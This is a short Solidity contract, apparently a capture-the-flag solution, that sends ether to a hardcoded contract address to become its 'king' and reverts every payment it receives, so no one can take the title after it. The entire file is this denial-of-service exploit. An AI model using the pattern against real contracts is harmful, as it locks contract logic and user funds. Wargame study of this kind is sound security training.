pragma solidity ^0.8.0;

contract KingAttck {
    address payable king = payable(0x9Ad19ea506D78965805dF36860b3A68Def674FAa);
    uint256 public prize;
    address public owner;

    constructor() {}

    function take_kingship() public payable {
        king.transfer(msg.value);
    }

    receive() external payable {
        revert();
    }
}